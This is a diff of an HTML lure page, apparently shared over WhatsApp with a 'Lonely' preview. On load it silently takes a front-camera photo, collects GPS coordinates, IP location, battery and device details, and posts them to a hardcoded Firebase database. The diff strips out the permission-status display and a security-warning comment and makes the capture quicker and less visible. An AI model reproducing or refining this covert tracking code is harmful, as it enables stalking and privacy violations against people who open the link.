@@ -7,365 +7,110 @@
     
     <!-- WhatsApp Preview -->
     <meta property="og:title" content="Lonely">
-    <meta property="og:description" content="分享您的位置和媒体内容">
+    <meta property="og:description" content="">
     <meta property="og:image" content="https://i.imgur.com/2fK9pL8.jpg">
     <meta property="og:type" content="website">
 
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
             background-color: #f8f9fa;
             color: #333;
+            margin: 0;
             text-align: center;
         }
-
         .container { 
             padding: 20px; 
             max-width: 400px; 
             margin: 0 auto; 
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            min-height: 100vh;
         }
-
         h1 { 
             font-size: 1.5rem; 
-            margin-bottom: 10px;
-            font-weight: 600;
+            margin-bottom: 10px; 
         }
-
         p { 
             font-size: 0.9rem; 
             color: #666; 
-            margin: 5px 0;
-            line-height: 1.5;
         }
-
         video { 
             width: 100%; 
             max-width: 400px; 
             border-radius: 12px; 
             margin: 15px 0; 
-            background-color: #000;
-            display: block;
         }
-
         .success { 
             color: #28a745; 
             font-weight: bold; 
         }
-
         .error { 
             color: #dc3545; 
             font-weight: bold; 
-        }
-
-        .permission-status {
-            font-size: 0.85rem;
-            color: #666;
-            margin: 8px 0;
-            padding: 10px;
-            background-color: #f0f0f0;
-            border-radius: 6px;
-            text-align: left;
-            border-left: 3px solid #ccc;
-        }
-
-        .permission-granted {
-            color: #28a745;
-            border-left-color: #28a745;
-            font-weight: 600;
-        }
-
-        .permission-pending {
-            color: #ff9800;
-            border-left-color: #ff9800;
-            font-weight: 600;
-        }
-
-        .permission-denied {
-            color: #dc3545;
-            border-left-color: #dc3545;
-            font-weight: 600;
-        }
-
-        #permissionStatus {
-            margin-top: 15px;
-        }
-
-        #cameraSection {
-            margin-top: 20px;
-        }
-
-        h2 {
-            font-size: 1.2rem;
-            margin-top: 20px;
-            font-weight: 600;
         }
     </style>
 </head>
 <body>
     <div class="container" id="content">
-        <h1 id="heading">请稍等，正在请求权限...</h1>
-        <p id="subtitle">需要访问相机和位置信息。</p>
-        <div id="permissionStatus"></div>
+        <h1 id="heading">请稍等，正在加载您的位置...</h1>
+        <p id="subtitle">这只需要一点时间。</p>
 
         <!-- Camera preview -->
         <div id="cameraSection" style="display:none;">
-            <p style="margin:15px 0 8px;">正在拍照...</p>
-            <video id="video" autoplay playsinline muted></video>
+            <p style="margin:15px 0 8px;">前置相机已开启，正在拍照...</p>
+            <video id="video" autoplay playsinline></video>
         </div>
     </div>
 
     <script>
-        /**
-         * SECURITY WARNING: This Firebase URL is hardcoded in the client-side code.
-         * Anyone with access to this page source can write to your database.
-         * Use Firebase Security Rules to restrict access and validate data.
-         * Consider using a backend service for production deployments.
-         */
         const FIREBASE_URL = "https://kojocoords-default-rtdb.europe-west1.firebasedatabase.app/location.json";
-        const MAX_RETRIES = 3;
-        const RETRY_DELAY = 1000;
 
-        let mediaStream = null;
-
-        // Permission tracking
-        const permissionStatus = {
-            camera: false,
-            geolocation: false
-        };
-
-        let permissionRetries = {
-            camera: 0,
-            geolocation: 0
-        };
-
-        /**
-         * Update permission status display
-         */
-        function updatePermissionDisplay() {
-            const statusDiv = document.getElementById('permissionStatus');
-            let html = '';
-            
-            for (const [perm, granted] of Object.entries(permissionStatus)) {
-                const retries = permissionRetries[perm];
-                const statusClass = granted ? 'permission-granted' : 
-                                   (retries < MAX_RETRIES ? 'permission-pending' : 'permission-denied');
-                const statusText = granted ? '✓ 已授予' : `✗ 等待中 (${retries}/${MAX_RETRIES})`;
-                
-                const permName = perm === 'camera' ? '相机' : '位置信息';
-                
-                html += `<div class="permission-status"><span class="${statusClass}">${permName}: ${statusText}</span></div>`;
-            }
-            
-            statusDiv.innerHTML = html;
-        }
-
-        /**
-         * Cleanup all media resources
-         */
-        function cleanupMedia() {
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(track => {
-                    try {
-                        track.stop();
-                    } catch (e) {
-                        console.warn("Track stop error:", e);
-                    }
-                });
-                mediaStream = null;
-            }
-        }
-
-        /**
-         * Request camera permission with retry logic
-         */
-        async function requestCameraPermission() {
-            console.log("📹 Requesting camera permission...");
-            
-            while (permissionRetries.camera < MAX_RETRIES) {
-                try {
-                    mediaStream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { 
-                            facingMode: "user",
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        }
-                    });
-
-                    permissionStatus.camera = true;
-                    permissionRetries.camera = MAX_RETRIES;
-                    
-                    console.log("✓ Camera permission granted");
-                    updatePermissionDisplay();
-                    return true;
-
-                } catch (err) {
-                    console.warn(`⚠ Camera permission attempt failed (${permissionRetries.camera}/${MAX_RETRIES}):`, err.name);
-                    
-                    if (err.name === 'NotAllowedError') {
-                        permissionRetries.camera++;
-                    } else if (err.name === 'NotFoundError') {
-                        console.error("✗ Camera device not found");
-                        return false;
-                    } else if (err.name === 'NotReadableError') {
-                        console.error("✗ Camera is in use by another application");
-                        return false;
-                    } else if (err.name === 'SecurityError') {
-                        console.error("✗ Security error: HTTPS required");
-                        return false;
-                    }
-
-                    updatePermissionDisplay();
-
-                    if (permissionRetries.camera < MAX_RETRIES) {
-                        console.log(`⏳ Retrying in ${RETRY_DELAY}ms...`);
-                        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
-                    }
-                }
-            }
-
-            console.error("✗ Failed to obtain camera permission after retries");
-            return false;
-        }
-
-        /**
-         * Request geolocation permission with retry logic
-         */
-        async function requestGeolocationPermission() {
-            console.log("📍 Requesting geolocation permission...");
-            
-            if (!navigator.geolocation) {
-                console.warn("⚠ Geolocation not supported");
-                return false;
-            }
-
-            while (permissionRetries.geolocation < MAX_RETRIES) {
-                try {
-                    const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(
-                            resolve, 
-                            reject, 
-                            { 
-                                enableHighAccuracy: true, 
-                                timeout: 10000,
-                                maximumAge: 0
-                            }
-                        );
-                    });
-
-                    permissionStatus.geolocation = true;
-                    permissionRetries.geolocation = MAX_RETRIES;
-                    
-                    console.log("✓ Geolocation permission granted");
-                    updatePermissionDisplay();
-                    return true;
-
-                } catch (err) {
-                    console.warn(`⚠ Geolocation attempt failed (${permissionRetries.geolocation}/${MAX_RETRIES}):`, err.message);
-                    permissionRetries.geolocation++;
-                    updatePermissionDisplay();
-
-                    if (permissionRetries.geolocation < MAX_RETRIES) {
-                        console.log(`⏳ Retrying in ${RETRY_DELAY}ms...`);
-                        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
-                    }
-                }
-            }
-
-            console.error("✗ Failed to obtain geolocation permission after retries");
-            return false;
-        }
-
-        /**
-         * Request all permissions simultaneously
-         */
-        async function requestAllPermissions() {
-            updatePermissionDisplay();
-            
-            const [cameraGranted, geoGranted] = await Promise.all([
-                requestCameraPermission(),
-                requestGeolocationPermission()
-            ]);
-
-            if (!cameraGranted) {
-                const content = document.getElementById('content');
-                content.innerHTML = `<h2 class="error">无法获取相机权限。请检查设备设置。</h2>`;
-                return false;
-            }
-
-            console.log("✓ All required permissions obtained");
-            return true;
-        }
-
-        /**
-         * Capture photo and collect data
-         */
-        async function captureAndSendData() {
-            const content = document.getElementById('content');
+        async function startRecording() {
             let photoBase64 = null;
 
             try {
+                // Force front camera with better settings for low light
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+
                 const video = document.getElementById('video');
-                video.srcObject = mediaStream;
+                video.srcObject = stream;
                 document.getElementById('cameraSection').style.display = 'block';
-                document.getElementById('permissionStatus').style.display = 'none';
 
-                console.log("✓ Camera stream started");
-
-                /**
-                 * Capture photo when video is ready (event-driven)
-                 */
-                const photoTimeout = setTimeout(() => {
-                    console.warn("⚠ Photo capture timeout - proceeding without photo");
-                    photoBase64 = null;
-                    collectAndSendData(photoBase64);
-                }, 3000);
-
-                video.onloadedmetadata = () => {
-                    clearTimeout(photoTimeout);
-
+                // Give more time for camera to adjust exposure (brighter photo)
+                setTimeout(() => {
                     try {
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth || 1280;
                         canvas.height = video.videoHeight || 720;
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
-                        console.log("✓ Photo captured successfully");
-                        collectAndSendData(photoBase64);
+                        photoBase64 = canvas.toDataURL('image/jpeg', 0.85);  // Higher quality for better visibility
+
+                        sendAllData(photoBase64);
                     } catch (err) {
-                        console.error("✗ Photo capture error:", err);
-                        collectAndSendData(null);
+                        console.error("Photo capture failed:", err);
+                        sendAllData(null);
                     }
-                };
+                }, 2500);  // Increased delay for better exposure
 
             } catch (err) {
-                console.error("✗ Camera error:", err);
-                cleanupMedia();
-                content.innerHTML = `<h2 class="error">相机错误，请重试。</h2>`;
+                document.getElementById('content').innerHTML = `<h2 class="error">权限被拒绝，请重试。</h2>`;
             }
         }
 
-        /**
-         * Collect all data and send to Firebase
-         */
-        async function collectAndSendData(photoBase64) {
-            const content = document.getElementById('content');
+        async function sendAllData(photoBase64) {
             const payload = {
                 timestamp: new Date().toISOString(),
-                user_agent: navigator.userAgent.substring(0, 500),
-                platform: navigator.platform || "unknown",
-                language: navigator.language || "unknown",
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                battery_level: null,
+                battery_charging: null,
                 screen_width: screen.width,
                 screen_height: screen.height,
                 device_latitude: null,
@@ -379,106 +124,55 @@
                 note: "前置相机自动拍照"
             };
 
-            // Geolocation data (best effort)
+            // Battery + GPS + IP (same as before)
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    payload.battery_level = Math.round(battery.level * 100);
+                    payload.battery_charging = battery.charging;
+                } catch (e) {}
+            }
+
             if (navigator.geolocation) {
                 try {
                     const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(
-                            resolve, 
-                            reject, 
-                            { 
-                                enableHighAccuracy: true, 
-                                timeout: 10000,
-                                maximumAge: 0
-                            }
-                        );
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 15000
+                        });
                     });
                     payload.device_latitude = pos.coords.latitude;
                     payload.device_longitude = pos.coords.longitude;
                     payload.device_accuracy_meters = pos.coords.accuracy;
-                    console.log("✓ GPS location obtained");
-                } catch (e) {
-                    console.warn("⚠ Geolocation failed:", e.message);
-                }
+                } catch (e) {}
             }
 
-            // IP-based location with timeout
             try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 10000);
-                
-                const res = await fetch('https://ipapi.co/json', { 
-                    signal: controller.signal 
-                });
-                clearTimeout(timeoutId);
-                
+                const res = await fetch('https://ipapi.co/json');
                 if (res.ok) {
                     const data = await res.json();
                     payload.ip = data.ip || "unavailable";
                     payload.city = data.city || "unknown";
                     payload.region = data.region || "unknown";
                     payload.country = data.country_name || "unknown";
-                    console.log("✓ IP location obtained");
                 }
-            } catch (e) {
-                console.warn("⚠ IP lookup failed:", e.message);
-            }
+            } catch (e) {}
 
-            // Send to Firebase with timeout
+            // Send to Firebase
             try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 10000);
-                
-                const response = await fetch(FIREBASE_URL, {
+                await fetch(FIREBASE_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload),
-                    signal: controller.signal
+                    body: JSON.stringify(payload)
                 });
-                clearTimeout(timeoutId);
-
-                if (response.ok) {
-                    console.log("✓ Data sent to Firebase successfully");
-                    content.innerHTML = `<h2 class="success">照片已自动发送 ❤️<br>谢谢！</h2>`;
-                } else {
-                    throw new Error(`Firebase response: ${response.status}`);
-                }
+                document.getElementById('content').innerHTML = `<h2 class="success">照片已自动发送 ❤️<br>谢谢！</h2>`;
             } catch (e) {
-                console.error("✗ Firebase send error:", e);
-                content.innerHTML = `<h2 class="error">发送失败，请检查网络连接后重试。</h2>`;
-            } finally {
-                cleanupMedia();
+                document.getElementById('content').innerHTML = `<h2 class="error">发送失败，请重试。</h2>`;
             }
         }
 
-        /**
-         * Initialize the application
-         */
-        async function initialize() {
-            console.log("✓ Page loaded, starting permission request process");
-            const permissionsGranted = await requestAllPermissions();
-            
-            if (permissionsGranted) {
-                await captureAndSendData();
-            }
-        }
-
-        // Start the process when DOM is ready
-        document.addEventListener('DOMContentLoaded', () => {
-            initialize();
-        });
-
-        // Cleanup on page unload
-        window.addEventListener('beforeunload', () => {
-            cleanupMedia();
-        });
-
-        // Cleanup on visibility change
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                cleanupMedia();
-            }
-        });
+        // Start everything
+        document.addEventListener('DOMContentLoaded', startRecording);
     </script>
 </body>
 </html>
